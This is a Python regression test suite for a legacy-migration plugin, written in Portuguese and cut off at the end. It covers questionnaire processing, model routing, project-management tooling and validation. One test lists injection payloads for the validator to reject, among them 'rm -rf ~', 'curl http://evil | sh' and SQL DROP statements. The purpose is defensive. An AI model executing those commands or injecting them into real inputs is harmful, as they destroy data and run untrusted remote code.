#!/usr/bin/env python3
"""Testes de regressao do plugin WX Claude Code. Rode: python3 tests/testes.py

Cada teste exercita um script de verdade num diretorio temporario e confere
a saida. Provas que antes eram manuais (questionario -> manifesto -> pre-flight,
roteador de modelos, PDCA, kanban, golden, hook do G0) viram regressao aqui.
"""

from __future__ import annotations

import json
import os
import shutil
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path

RAIZ = Path(__file__).resolve().parents[1]
SCRIPTS = RAIZ / "skills" / "conversao-wx" / "scripts"
EXEMPLO = RAIZ / "exemplos" / "estoque-wx"


def run(*args: str, entrada: str | None = None, cwd: Path | None = None) -> subprocess.CompletedProcess:
    return subprocess.run([sys.executable, *map(str, args)], input=entrada, capture_output=True, text=True, cwd=cwd)


class Questionario(unittest.TestCase):
    def setUp(self):
        self.tmp = Path(tempfile.mkdtemp())
        shutil.copytree(EXEMPLO / "inputs", self.tmp / "inputs")
        (self.tmp / ".wx-migration").mkdir()
        shutil.copy(EXEMPLO / "questionario.json", self.tmp / ".wx-migration" / "questionario.json")

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def test_aplica_e_nao_sobrescreve(self):
        r = run(SCRIPTS / "aplicar_questionario.py", "--questionario", self.tmp / ".wx-migration/questionario.json", "--project-root", self.tmp, "--plugin-root", RAIZ)
        self.assertEqual(r.returncode, 0, r.stderr)
        self.assertIn("modo=inventory", r.stdout)
        m = json.loads((self.tmp / ".wx-migration/wx-inputs.manifest.json").read_text())
        self.assertEqual(m["artifacts"]["sql_scripts"]["status"], "provided")
        self.assertEqual(m["evidence_root"], "../inputs")
        self.assertEqual(m["artifacts"]["sample_data_and_expected_results"]["status"], "provided")
        self.assertEqual(len(m["artifacts"]["sample_data_and_expected_results"]["items"]), 2)
        self.assertTrue((self.tmp / "DESIGN.md").exists())
        design = (self.tmp / "DESIGN.md").read_text()
        for secao in ("Grids (F3", "Formulários (F4", "Números, datas e moeda (F5", "Acessibilidade (F8"):
            self.assertIn(secao, design)
        self.assertIn("F2 novo", design); self.assertIn("Edição na célula: sim", design)
        self.assertIn("| selecionar | SELECIONAR REGISTRO | check | #1F5FBF |", design)
        self.assertIn("Barra da grade: acima da grade, alinhada à direita", design)
        self.assertIn("«Confirma a exclusão do registro?»", design)
        self.assertIn("Tipo: textura", design)
        self.assertIn("| WIN_Venda | principal | screenshots/win-venda-com-itens.png | provided |", design)
        self.assertIn("- totais no rodapé da grade", design)
        self.assertIn("Modo Impeccable: **Operate**", (self.tmp / "PRODUCT.md").read_text())
        self.assertIn("Estilo de resposta", (self.tmp / "CLAUDE.md").read_text())
        # bloco 0: empresa, governanca para o PMO e entrega sem senha
        empresa = (self.tmp / ".wx-migration/empresa.md").read_text()
        self.assertIn("Boller Sistemas Ltda", empresa); self.assertIn("Blumenau - SC", empresa)
        self.assertIn("marca/logotipo-estoque.svg (provided)", empresa); self.assertIn("| Maria Souza | Diretora comercial |", empresa)
        self.assertIn("**Prazo final de entrega: 2026-12-18**", (self.tmp / ".wx-migration/pmo/cronograma.md").read_text())
        self.assertIn("e1 --> e2", (self.tmp / ".wx-migration/pmo/fluxograma.md").read_text())
        self.assertIn("| RSK-002 |", (self.tmp / ".wx-migration/pmo/riscos.md").read_text())
        entrega = json.loads((self.tmp / ".wx-migration/entrega.json").read_text())
        self.assertEqual(entrega["credencial_ref"], "GITHUB_TOKEN"); self.assertEqual(entrega["github"]["usuario"], "adrianoboller")
        self.assertNotIn("abc", json.dumps(entrega))
        r2 = run(SCRIPTS / "aplicar_questionario.py", "--questionario", self.tmp / ".wx-migration/questionario.json", "--project-root", self.tmp, "--plugin-root", RAIZ)
        proc = (self.tmp / ".wx-migration/processo-de-conversao.md").read_text()
        self.assertIn("## Backend: Rust", proc); self.assertIn("**reescrita-guiada**", proc)
        self.assertIn("| Analise HFSQL | esquema PostgreSQL migrado por script; sqlx/diesel | G3 |", proc)
        self.assertIn("Ritmo: modulo a modulo", proc)
        self.assertEqual(r2.stdout.count("SKIPPED"), 32); self.assertIn("UPDATED", r2.stdout)
        resp = (self.tmp / ".wx-migration/respostas_questionario.md").read_text()
        self.assertIn("- Nome: **Adriano Boller**", resp); self.assertIn("## H · Backend de destino", resp)
        self.assertIn("0.15 github", resp); self.assertIn("credencial ref: GITHUB_TOKEN", resp)
        self.assertIn("respostas_questionario.md", (self.tmp / "CLAUDE.md").read_text())

    def test_tela_modelo_inexistente_e_recusada(self):
        q = json.loads((self.tmp / ".wx-migration/questionario.json").read_text())
        q["F_estilo_impeccable"]["F0_tela_modelo"]["arquivos"][0]["arquivo"] = "screenshots/nao-existe.png"
        (self.tmp / ".wx-migration/questionario.json").write_text(json.dumps(q))
        r = run(SCRIPTS / "aplicar_questionario.py", "--questionario", self.tmp / ".wx-migration/questionario.json", "--project-root", self.tmp, "--plugin-root", RAIZ)
        self.assertEqual(r.returncode, 2); self.assertIn("nao-existe.png", r.stderr)
        self.assertFalse((self.tmp / "DESIGN.md").exists())

    def test_estrategia_desconhecida_e_recusada(self):
        q = json.loads((self.tmp / ".wx-migration/questionario.json").read_text())
        q["H_backend"]["processo"]["estrategia"] = "big-bang"
        (self.tmp / ".wx-migration/questionario.json").write_text(json.dumps(q))
        r = run(SCRIPTS / "aplicar_questionario.py", "--questionario", self.tmp / ".wx-migration/questionario.json", "--project-root", self.tmp, "--plugin-root", RAIZ)
        self.assertEqual(r.returncode, 2); self.assertIn("big-bang", r.stderr)

    def test_ambiente_gera_instalador_papeis_e_env_sem_valores(self):
        r = run(SCRIPTS / "aplicar_questionario.py", "--questionario", self.tmp / ".wx-migration/questionario.json", "--project-root", self.tmp, "--plugin-root", RAIZ)
        self.assertEqual(r.returncode, 0, r.stderr)
        amb = self.tmp / ".wx-migration/ambiente"
        sql = (amb / "papeis-postgresql.sql").read_text()
        self.assertIn("CREATE ROLE \"estoque_app\" LOGIN NOSUPERUSER PASSWORD '${ESTOQUE_APP_PASSWORD}';", sql)
        self.assertIn('GRANT SELECT ON ALL TABLES IN SCHEMA public TO "estoque_bi";', sql)
        env = (amb / ".env.exemplo").read_text()
        for l in env.splitlines():
            if l and not l.startswith("#"):
                self.assertTrue(l.endswith("="), l)
        sh = (amb / "instalar-ambiente.sh").read_text()
        self.assertIn("rustup update stable", sh); self.assertIn("${PGPASSWORD:?", sh); self.assertIn("git remote add origin https://github.com/adrianoboller/estoque-rs", sh)
        self.assertEqual(subprocess.run(["bash", "-n", str(amb / "instalar-ambiente.sh")]).returncode, 0)
        self.assertFalse((amb / "papeis-mysql.sql").exists())
        self.assertIn("| PostgreSQL | sim | 16 |", (self.tmp / ".wx-migration/ambiente.md").read_text())
        # papel sem senha_ref ou nivel desconhecido e recusado antes de gravar
        q = json.loads((self.tmp / ".wx-migration/questionario.json").read_text())
        q["K_ambiente"]["K2_postgresql"]["papeis"][0]["nivel"] = "admin"
        (self.tmp / ".wx-migration/q2.json").write_text(json.dumps(q))
        r = run(SCRIPTS / "aplicar_questionario.py", "--questionario", self.tmp / ".wx-migration/q2.json", "--project-root", self.tmp, "--plugin-root", RAIZ)
        self.assertEqual(r.returncode, 2); self.assertIn("admin", r.stderr)

    def test_n8n_e_privilegios(self):
        run(SCRIPTS / "aplicar_questionario.py", "--questionario", self.tmp / ".wx-migration/questionario.json", "--project-root", self.tmp, "--plugin-root", RAIZ)
        amb = self.tmp / ".wx-migration/ambiente"
        sh = (amb / "instalar-ambiente.sh").read_text()
        self.assertIn('if command -v sudo >/dev/null; then SUDO="sudo"', sh); self.assertIn("exec su root -c", sh)
        self.assertIn("priv apt-get install -y postgresql-16", sh); self.assertIn("docker compose up -d", sh)
        comp = (amb / "n8n/docker-compose.yml").read_text()
        self.assertIn("N8N_ENCRYPTION_KEY=${N8N_ENCRYPTION_KEY}", comp); self.assertIn("DB_POSTGRESDB_PASSWORD=${N8N_DB_PASSWORD}", comp)
        self.assertNotRegex(comp, r"PASSWORD=[^$\n]")
        itg = (amb / "n8n/integracao.md").read_text()
        self.assertIn("| estoque-baixo | POST | /webhook/estoque-baixo |", itg); self.assertIn("| Fechamento diário | cron 23:00 |", itg)
        self.assertIn("| n8n | sim | 1.100 (docker) |", (self.tmp / ".wx-migration/ambiente.md").read_text())
        q = json.loads((self.tmp / ".wx-migration/questionario.json").read_text())
        q["K_ambiente"]["K7_n8n"]["modo"] = "kubernetes"
        (self.tmp / ".wx-migration/q3.json").write_text(json.dumps(q))
        r = run(SCRIPTS / "aplicar_questionario.py", "--questionario", self.tmp / ".wx-migration/q3.json", "--project-root", self.tmp, "--plugin-root", RAIZ)
        self.assertEqual(r.returncode, 2); self.assertIn("kubernetes", r.stderr)
        q["K_ambiente"]["K7_n8n"]["modo"] = "docker"; q["K_ambiente"]["K7_n8n"]["instalar"] = False
        t2 = Path(tempfile.mkdtemp()); shutil.copytree(EXEMPLO / "inputs", t2 / "inputs"); (t2 / ".wx-migration").mkdir()
        (t2 / ".wx-migration/questionario.json").write_text(json.dumps(q))
        run(SCRIPTS / "aplicar_questionario.py", "--questionario", t2 / ".wx-migration/questionario.json", "--project-root", t2, "--plugin-root", RAIZ)
        self.assertFalse((t2 / ".wx-migration/ambiente/n8n").exists()); shutil.rmtree(t2, ignore_errors=True)

    def test_contexto_do_claude_code_kickoff_index_hooks_mcp_docker(self):
        r = run(SCRIPTS / "aplicar_questionario.py", "--questionario", self.tmp / ".wx-migration/questionario.json", "--project-root", self.tmp, "--plugin-root", RAIZ)
        self.assertEqual(r.returncode, 0, r.stderr)
        kick = (self.tmp / ".wx-migration/prompts/kickoff.md").read_text()
        self.assertIn("**Isto não é vibe coding**", kick); self.assertIn("aprovador: **Adriano Boller**", kick)
        self.assertIn("3. O sistema deve registrar entrada e saída", kick); self.assertIn("Fora da v1: Etiquetas térmicas", kick)
        self.assertIn("Tela modelo (referência visual): WIN_Venda (principal", (self.tmp / ".wx-migration/prompts/prototipacao.md").read_text())
        idx = (self.tmp / "INDEX_FILES.md").read_text()
        self.assertIn("| `INDEX_FILES.md` | este mapa; regravado a cada aplicação do questionário | existe |", idx)
        self.assertIn("| `.wx-migration/respostas_questionario.md` |", idx); self.assertIn("| existe |", idx.split("respostas_questionario.md")[1].split("\n")[0])
        self.assertIn("| `./inputs/banco.sql` | script SQL |", idx)
        st = json.loads((self.tmp / ".claude/settings.json").read_text())
        self.assertEqual(st["hooks"]["Stop"][0]["hooks"][0]["command"], "bash .claude/hooks/testar.sh"); self.assertIn("Read(./.env)", st["permissions"]["deny"])
        self.assertIn("cargo test --workspace", (self.tmp / ".claude/hooks/testar.sh").read_text())
        self.assertTrue((self.tmp / ".claude/skills/regras-do-legado/SKILL.md").read_text().startswith("---\nname: regras-do-legado"))
        mcp = json.loads((self.tmp / ".mcp.json").read_text())
        self.assertEqual(set(mcp["mcpServers"]), {"postgresql", "github"}); self.assertIn("${GITHUB_TOKEN}", json.dumps(mcp))
        self.assertIn("COPY --from=build /app/target/release/estoque", (self.tmp / "Dockerfile").read_text())
        comp = (self.tmp / "docker-compose.yml").read_text(); self.assertIn("POSTGRES_PASSWORD=${PGPASSWORD}", comp); self.assertIn("- ESTOQUE_API_KEY=${ESTOQUE_API_KEY}", comp)
        self.assertIn("INDEX_FILES.md", (self.tmp / "CLAUDE.md").read_text())
        q = json.loads((self.tmp / ".wx-migration/questionario.json").read_text())
        q["L_contexto_e_implantacao"]["L5_mcp_e_skills"]["mcps"] = ["slack"]
        (self.tmp / ".wx-migration/q4.json").write_text(json.dumps(q))
        r = run(SCRIPTS / "aplicar_questionario.py", "--questionario", self.tmp / ".wx-migration/q4.json", "--project-root", self.tmp, "--plugin-root", RAIZ)
        self.assertEqual(r.returncode, 2); self.assertIn("slack", r.stderr)

    def test_injecao_no_questionario_e_recusada_antes_de_gravar(self):
        """Valor do questionario vira bash com sudo, SQL de superusuario e YAML: tudo que nao e identificador e recusado."""
        base = json.loads((self.tmp / ".wx-migration/questionario.json").read_text())
        casos = [
            ("0_empresa_e_projeto.0_15_github.diretorio_destino", '/tmp"; rm -rf ~ #', "0.15 diretorio_destino"),
            ("0_empresa_e_projeto.0_15_github.credencial_ref", "X:-y", "credencial_ref"),
            ("0_empresa_e_projeto.0_15_github.url", "https://github.com/a/b; curl http://evil | sh", "0.15 url"),
            ("K_ambiente.K0_privilegios.usuario_root", "root; id #", "K0 usuario_root"),
            ("K_ambiente.K2_postgresql.banco", "app; DROP DATABASE prod; --", "K2_postgresql banco"),
            ("K_ambiente.K2_postgresql.papeis.0.nome", "u'; DROP ROLE postgres; --", "papel nome"),
            ("K_ambiente.K2_postgresql.senha_ref", 'X}"; id #', "senha_ref"),
            ("K_ambiente.K7_n8n.porta", '5678"]\n    privileged: true', "K7 porta"),
            ("L_contexto_e_implantacao.L3_implantacao.variaveis_de_ambiente.0", "FOO=bar\n      - EVIL=1", "variavel de ambiente"),
            ("K_ambiente.K2_postgresql.senha_do_banco", "hunter2", "senha_do_banco"),
            ("0_empresa_e_projeto.0_1_softhouse.solicitacao", "token ghp_abcdefghijklmnopqrstuvwxyz0123456789", "formato de token"),
        ]
        for caminho, valor, trecho in casos:
            q = json.loads(json.dumps(base)); cur = q; partes = caminho.split(".")
            for k in partes[:-1]:
                cur = cur[int(k)] if isinstance(cur, list) else cur[k]
            if isinstance(cur, list): cur[int(partes[-1])] = valor
            else: cur[partes[-1]] = valor
            (self.tmp / ".wx-migration/qx.json").write_text(json.dumps(q))
            t2 = Path(tempfile.mkdtemp()); shutil.copytree(EXEMPLO / "inputs", t2 / "inputs"); (t2 / ".wx-migration").mkdir()
            shutil.copy(self.tmp / ".wx-migration/qx.json", t2 / ".wx-migration/questionario.json")
            r = run(SCRIPTS / "aplicar_questionario.py", "--questionario", t2 / ".wx-migration/questionario.json", "--project-root", t2, "--plugin-root", RAIZ)
            self.assertEqual(r.returncode, 2, f"{caminho} deveria ser recusado: {r.stdout[-200:]}")
            self.assertIn(trecho, r.stderr, caminho)
            self.assertFalse((t2 / ".wx-migration/ambiente").exists(), caminho); self.assertFalse((t2 / "CLAUDE.md").exists(), caminho)
            self.assertNotIn("hunter2", r.stderr + r.stdout)
            shutil.rmtree(t2, ignore_errors=True)

    def test_verificar_ambiente_mede_e_devolve_3_quando_falta(self):
        q = {"K_ambiente": {"K1_rust": {"instalar_ou_atualizar": True, "versao_minima": "999.0"}, "K6_github": {"ligar_projeto": True}}}
        (self.tmp / "q.json").write_text(json.dumps(q))
        r = run(SCRIPTS / "verificar_ambiente.py", "--questionario", self.tmp / "q.json", "--json")
        self.assertEqual(r.returncode, 3)
        linhas = json.loads(r.stdout)
        rustc = next(l for l in linhas if l["programa"] == "rustc"); self.assertEqual(rustc["estado"], "falta")
        git = next(l for l in linhas if l["programa"] == "git"); self.assertEqual(git["estado"], "ok")
        q["K_ambiente"]["K1_rust"]["versao_minima"] = "1.0"; q["K_ambiente"]["K6_github"]["ligar_projeto"] = False
        (self.tmp / "q.json").write_text(json.dumps(q))
        self.assertEqual(run(SCRIPTS / "verificar_ambiente.py", "--questionario", self.tmp / "q.json").returncode, 0)

    def test_senha_em_texto_puro_e_recusada(self):
        q = json.loads((self.tmp / ".wx-migration/questionario.json").read_text())
        q["0_empresa_e_projeto"]["0_15_github"]["senha"] = "abc123"
        (self.tmp / ".wx-migration/questionario.json").write_text(json.dumps(q))
        r = run(SCRIPTS / "aplicar_questionario.py", "--questionario", self.tmp / ".wx-migration/questionario.json", "--project-root", self.tmp, "--plugin-root", RAIZ)
        self.assertEqual(r.returncode, 2)
        self.assertIn("0_15_github.senha", r.stderr)
        self.assertNotIn("abc123", r.stderr + r.stdout)
        self.assertFalse((self.tmp / ".wx-migration/entrega.json").exists())

    def test_pmo_iniciar_le_prazo_e_marcos_do_bloco_0(self):
        run(SCRIPTS / "aplicar_questionario.py", "--questionario", self.tmp / ".wx-migration/questionario.json", "--project-root", self.tmp, "--plugin-root", RAIZ)
        run(SCRIPTS / "pmo.py", "--project-root", self.tmp, "iniciar")
        plano = json.loads((self.tmp / ".wx-migration/pmo/plano.json").read_text())
        self.assertEqual(plano["aprovador_padrao"], "Adriano Boller")
        self.assertEqual(plano["prazo_final"], "2026-12-18"); self.assertEqual(plano["gates"]["G4"]["previsto_para"], "2026-10-30")
        st = run(SCRIPTS / "pmo.py", "--project-root", self.tmp, "status").stdout
        self.assertIn("Prazo final de entrega: 2026-12-18", st); self.assertIn("180000 BRL", st)

    def test_status_provided_sem_arquivo_e_recusado(self):
        q = json.loads((self.tmp / ".wx-migration/questionario.json").read_text())
        q["A_sql"]["arquivos"] = []
        (self.tmp / ".wx-migration/questionario.json").write_text(json.dumps(q))
        r = run(SCRIPTS / "aplicar_questionario.py", "--questionario", self.tmp / ".wx-migration/questionario.json", "--project-root", self.tmp, "--plugin-root", RAIZ)
        self.assertEqual(r.returncode, 2)
        self.assertIn("provided", r.stderr)

    def test_preflight_do_exemplo_nao_bloqueia_por_schema(self):
        run(SCRIPTS / "aplicar_questionario.py", "--questionario", self.tmp / ".wx-migration/questionario.json", "--project-root", self.tmp, "--plugin-root", RAIZ)
        r = run(SCRIPTS / "wx_preflight.py", "--manifest", self.tmp / ".wx-migration/wx-inputs.manifest.json", "--allowed-evidence-root", self.tmp / "inputs", "--workspace-root", self.tmp, "--output", self.tmp / ".wx-migration/preflight")
        # wx_preflight.py devolve 0 para READY e 2 para CONDITIONAL; BLOCKED e erro de schema tambem dao != 0,
        # por isso o status e conferido na saida, nao no codigo.
        self.assertIn('"status": "CONDITIONAL"', r.stdout, r.stderr)
        rel = sorted((self.tmp / ".wx-migration/preflight/runs").glob("*/report.md"))[-1].read_text()
        for codigo in ("INVALID_SIGNATURE", "SQL_METADATA_MISSING", "EVIDENCE_ROOT", "SCHEMA"):
            self.assertNotIn(codigo, rel, f"{codigo} apareceu no pré-flight do exemplo")


class Roteador(unittest.TestCase):
    def rotear(self, *args):
        r = run(SCRIPTS / "rotear_modelo.py", *args)
        return json.loads(r.stdout), r.returncode

    def test_classes_e_escaladas(self):
        d, _ = self.rotear("--classe", "mecanica"); self.assertEqual(d["modelo"], "haiku")
        d, _ = self.rotear("--classe", "analise", "--sinal", "fiscal"); self.assertEqual(d["modelo"], "opus")
        d, _ = self.rotear("--classe", "mecanica", "--sinal", "conflito"); self.assertEqual(d["modelo"], "sonnet")
        d, _ = self.rotear("--classe", "revisao", "--sinal", "padrao-aprovado"); self.assertEqual((d["modelo"], d["effort"]), ("opus", "max"))
        d, _ = self.rotear("--classe", "decisao", "--indisponivel", "opus"); self.assertEqual(d["modelo"], "sonnet"); self.assertTrue(any("fallback" in m for m in d["motivos"]))

    def test_orcamento_rebaixa_e_bloqueia(self):
        tmp = Path(tempfile.mkdtemp())
        try:
            run(SCRIPTS / "pmo.py", "--project-root", tmp, "iniciar")
            orc = tmp / ".wx-migration/pmo/orcamento.json"
            o = json.loads(orc.read_text()); o["gates"]["G1"]["tokens_previstos"] = 1000; orc.write_text(json.dumps(o))
            run(SCRIPTS / "pmo.py", "--project-root", tmp, "gastar", "--gate", "G1", "--modelo", "sonnet", "--tokens", "850")
            d, rc = self.rotear("--project-root", tmp, "--classe", "decisao", "--gate", "G1")
            self.assertEqual((d["modelo"], rc), ("sonnet", 0))
            run(SCRIPTS / "pmo.py", "--project-root", tmp, "gastar", "--gate", "G1", "--modelo", "opus", "--tokens", "200")
            d, rc = self.rotear("--project-root", tmp, "--classe", "analise", "--gate", "G1")
            self.assertEqual((d["estado"], rc), ("BLOQUEADO", 3))
        finally:
            shutil.rmtree(tmp, ignore_errors=True)


class PMO(unittest.TestCase):
    def setUp(self):
        self.tmp = Path(tempfile.mkdtemp())
        (self.tmp / ".wx-migration").mkdir()
        (self.tmp / ".wx-migration/traceability.csv").write_text(
            "trace_id,kind,source_artifact,source_locator,source_sha256,legacy_symbol,rule_summary,decision_id,target_component,target_file,target_symbol,test_id,test_file,expected,actual,target_commit,test_result_ref,approved_by,approved_at,status,confidence,notes\n"
            + "".join(f"BR-{i:03d},business_rule,,,,,regra {i},,,,,,,,,,,,,implemented,,\n" for i in range(1, 9))
            + "BR-009,business_rule,,,,,regra 9,,,,,,,,,,,Adriano,,accepted,,\n")
        run(SCRIPTS / "pmo.py", "--project-root", self.tmp, "iniciar", "--aprovador", "Adriano")

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def test_pdca_infrutifero_exige_proxima_e_grava_na_base(self):
        run(SCRIPTS / "pmo.py", "--project-root", self.tmp, "pdca", "abrir", "--gate", "G4", "--hipotese", "h1", "--medida", "m", "--criterio", ">= 1,5x")
        r = run(SCRIPTS / "pmo.py", "--project-root", self.tmp, "pdca", "fechar", "--id", "PDCA-001", "--resultado", "infrutifero", "--medido", "1,06x", "--aprendizado", "a")
        self.assertEqual(r.returncode, 2); self.assertIn("proxima", r.stderr)
        r = run(SCRIPTS / "pmo.py", "--project-root", self.tmp, "pdca", "fechar", "--id", "PDCA-001", "--resultado", "infrutifero", "--medido", "1,06x", "--aprendizado", "a", "--proxima", "h2")
        self.assertEqual(r.returncode, 0, r.stderr)
        base = (self.tmp / ".wx-migration/pmo/base_de_conhecimento.md").read_text()
        self.assertIn("| PDCA-001 |", base); self.assertIn("infrutifero", base)
        r = run(SCRIPTS / "pmo.py", "--project-root", self.tmp, "pdca", "fechar", "--id", "PDCA-001", "--resultado", "frutifero", "--medido", "x", "--aprendizado", "a")
        self.assertEqual(r.returncode, 2)

    def test_kanban_marca_wip_estourado(self):
        r = run(SCRIPTS / "pmo.py", "--project-root", self.tmp, "kanban")
        self.assertIn("Em andamento (8 / WIP 6)  **WIP ESTOURADO**", r.stdout)

    def test_sprint_uma_por_vez_e_resumo(self):
        r = run(SCRIPTS / "pmo.py", "--project-root", self.tmp, "sprint", "abrir", "--nome", "s1", "--objetivo", "o", "--gate", "G4", "--item", "BR-009", "--item", "BR-001")
        self.assertEqual(r.returncode, 0, r.stderr)
        r = run(SCRIPTS / "pmo.py", "--project-root", self.tmp, "sprint", "abrir", "--nome", "s2", "--objetivo", "o", "--gate", "G4")
        self.assertEqual(r.returncode, 2)
        r = run(SCRIPTS / "pmo.py", "--project-root", self.tmp, "sprint", "fechar", "--decisao", "CONDITIONAL")
        self.assertIn("prontos 1/2", r.stdout)
        arq = next((self.tmp / ".wx-migration/pmo/sprints").glob("Bloco0001-SP00001-*.md")); resumo = arq.read_text()
        self.assertIn("## 12. Retrospectiva", resumo); self.assertIn("BR-001", resumo)
        self.assertIn("| Identificação | Bloco0001-SP00001-", resumo)
        import zipfile; self.assertEqual(zipfile.ZipFile(arq.with_suffix(".zip")).namelist(), [arq.name])  # toda sprint tem a copia .md zipada
        ident = run(SCRIPTS / "pmo.py", "--project-root", self.tmp, "identificacao").stdout.strip()
        self.assertRegex(ident, r"^Bloco0001-SP00001-.+ · \d{4}-\d{2}-\d{2} \(sprint fechada; abra a próxima\)$")
        r = run(SCRIPTS / "pmo.py", "--project-root", self.tmp, "bloco", "abrir", "--titulo", "Análise da base de dados", "--gate", "G1")
        self.assertIn("Bloco0002", r.stdout)
        r = run(SCRIPTS / "pmo.py", "--project-root", self.tmp, "sprint", "abrir", "--nome", "Análise da base de dados", "--objetivo", "o", "--gate", "G1", "--item", "BR-001", "--aprovador", "A")
        self.assertIn("Bloco0002-SP00002-Análise da base de dados", r.stdout)
        h = run(SCRIPTS / "pmo.py", "--project-root", self.tmp, "hook-identificacao", entrada="{}").stdout
        self.assertIn("Bloco0002-SP00002-Análise da base de dados ·", h); self.assertIn("UserPromptSubmit", h)

    def test_backlog_com_papel_e_entrega_zipada(self):
        import zipfile
        r = run(SCRIPTS / "pmo.py", "--project-root", self.tmp, "sprint", "abrir", "--nome", "s1", "--objetivo", "o", "--gate", "G5", "--item", "BR-001:B", "--item", "BR-009:F")
        self.assertEqual(r.returncode, 0, r.stderr)
        r = run(SCRIPTS / "pmo.py", "--project-root", self.tmp, "sprint", "abrir", "--nome", "x", "--objetivo", "o", "--gate", "G5", "--item", "BR-002:Z")
        self.assertEqual(r.returncode, 2)
        kb = run(SCRIPTS / "pmo.py", "--project-root", self.tmp, "kanban").stdout
        self.assertIn("[B engenheiro] `BR-001`", kb); self.assertIn("[F prova-real] `BR-009`", kb); self.assertIn("[sem papel] `BR-002`", kb)
        run(SCRIPTS / "pmo.py", "--project-root", self.tmp, "sprint", "fechar", "--decisao", "APPROVED")
        r = run(SCRIPTS / "pmo.py", "--project-root", self.tmp, "entregar", "--sprint", "1", "--plugin-root", RAIZ)
        self.assertEqual(r.returncode, 0, r.stderr)
        z = next((self.tmp / ".wx-migration/pmo/entregas").glob("sprint-01-G5-*.zip"))
        nomes = zipfile.ZipFile(z).namelist()
        for n in ("sprint-01/resumo-da-sprint.md", "sprint-01/tecnicas-aplicadas.md", "sprint-01/base-de-conhecimento.md", "sprint-01/ferramentas.md", "sprint-01/kanban.md", "sprint-01/backlog.md"):
            self.assertIn(n, nomes)
        ferr = zipfile.ZipFile(z).read("sprint-01/ferramentas.md").decode()
        self.assertIn("pmo.py", ferr); self.assertIn("golden.py", ferr)
        tec = zipfile.ZipFile(z).read("sprint-01/tecnicas-aplicadas.md").decode()
        self.assertIn("## PDCA", tec); self.assertIn("Fonte:", tec)

    def test_relatorio_e_painel_saem_ao_fechar_sprint_e_na_entrega(self):
        tmp = Path(tempfile.mkdtemp())
        try:
            shutil.copytree(EXEMPLO / "inputs", tmp / "inputs"); (tmp / ".wx-migration").mkdir()
            shutil.copy(EXEMPLO / "questionario.json", tmp / ".wx-migration" / "questionario.json")
            run(SCRIPTS / "aplicar_questionario.py", "--questionario", tmp / ".wx-migration/questionario.json", "--project-root", tmp, "--plugin-root", RAIZ)
            run(SCRIPTS / "pmo.py", "--project-root", tmp, "iniciar", "--aprovador", "A")
            (tmp / ".wx-migration/traceability.csv").write_text("trace_id,kind,status,notes\nBR-001,business_rule,accepted,\nINT-001,integration,blocked,sem ambiente\n")
            r = run(SCRIPTS / "pmo.py", "--project-root", tmp, "relatorio").stdout
            for secao in ("## 1. Empresa e contrato", "Prazo final: **2026-12-18**", "| business_rule |", "Itens bloqueados: 1", "| RSK-001 |", "## 11. Próximos passos", "Desbloquear 1 item(ns): INT-001", "credencial em `GITHUB_TOKEN`"):
                self.assertIn(secao, r)
            self.assertNotIn("abc123", r)
            run(SCRIPTS / "pmo.py", "--project-root", tmp, "sprint", "abrir", "--nome", "S1", "--objetivo", "o", "--gate", "G4", "--item", "BR-001:B", "--aprovador", "A")
            r = run(SCRIPTS / "pmo.py", "--project-root", tmp, "sprint", "fechar", "--decisao", "APPROVED", "--pedido", "")
            self.assertIn("painel.html", r.stdout); self.assertTrue((tmp / ".wx-migration/pmo/painel.html").is_file()); self.assertTrue((tmp / ".wx-migration/pmo/relatorio.md").is_file())
            self.assertIn("Empresa e contrato", (tmp / ".wx-migration/pmo/painel.html").read_text())
            r = run(SCRIPTS / "pmo.py", "--project-root", tmp, "entregar", "--plugin-root", RAIZ)
            import zipfile
            z = zipfile.ZipFile(next((tmp / ".wx-migration/pmo/entregas").glob("*.zip")))
            nomes = z.namelist()
            self.assertTrue(any(n.endswith("/painel.html") for n in nomes)); self.assertTrue(any(n.endswith("/relatorio.md") for n in nomes))
        finally:
            shutil.rmtree(tmp, ignore_errors=True)

    def test_status_sem_numero_inventado(self):
        r = run(SCRIPTS / "pmo.py", "--project-root", self.tmp, "status")
        self.assertIn("1/9 = 11.1%", r.stdout)
        self.assertIn("| G1 | 0 | 0 | — |", r.stdout)


class Golden(unittest.TestCase):
    def test_compara_com_tolerancia(self):
        tmp = Path(tempfile.mkdtemp())
        try:
            run(SCRIPTS / "golden.py", "capturar", "--casos", EXEMPLO / "inputs/dados-de-amostra/resultados-esperados.json", "--saida", tmp / "g.json")
            res = {"resultados": [{"id": "TST-BR-001-a", "resultado": 249.382}, {"id": "TST-BR-004-b", "resultado": [33.33, 33.33, 33.34]}, {"id": "TST-BR-005-b", "resultado": True}]}
            (tmp / "r.json").write_text(json.dumps(res))
            r = run(SCRIPTS / "golden.py", "comparar", "--golden", tmp / "g.json", "--resultados", tmp / "r.json", "--relatorio", tmp / "c.json")
            self.assertEqual(r.returncode, 1)
            rel = json.loads((tmp / "c.json").read_text())
            por = {c["id"]: c["passou"] for c in rel["casos"]}
            self.assertTrue(por["TST-BR-001-a"]); self.assertTrue(por["TST-BR-004-b"]); self.assertFalse(por["TST-BR-005-b"])
            self.assertEqual(rel["equivalencia"], "2/10")
        finally:
            shutil.rmtree(tmp, ignore_errors=True)


class ExtrairPdf(unittest.TestCase):
    def test_extrai_com_localizador(self):
        try:
            import pypdf  # noqa: F401
        except ImportError:
            self.skipTest("pypdf ausente")
        tmp = Path(tempfile.mkdtemp())
        try:
            shutil.copytree(EXEMPLO / "inputs", tmp / "inputs"); (tmp / ".wx-migration").mkdir()
            shutil.copy(EXEMPLO / "questionario.json", tmp / ".wx-migration/questionario.json")
            run(SCRIPTS / "aplicar_questionario.py", "--questionario", tmp / ".wx-migration/questionario.json", "--project-root", tmp, "--plugin-root", RAIZ)
            r = run(SCRIPTS / "extrair_pdf.py", "--manifest", tmp / ".wx-migration/wx-inputs.manifest.json", "--allowed-evidence-root", tmp / "inputs", "--output", tmp / ".wx-migration/evidence/pdf-text")
            self.assertEqual(r.returncode, 0, r.stderr)
            s = json.loads((tmp / ".wx-migration/evidence/pdf-text/sumario.json").read_text())
            self.assertEqual(len(s["arquivos"]), 4); self.assertEqual(s["ocr_required"], [])
            self.assertIn("CalculaDesconto", (tmp / ".wx-migration/evidence/pdf-text/estoque-codigo/0001.txt").read_text())
        finally:
            shutil.rmtree(tmp, ignore_errors=True)


class HookG0(unittest.TestCase):
    def hook(self, tmp: Path, arquivo: str):
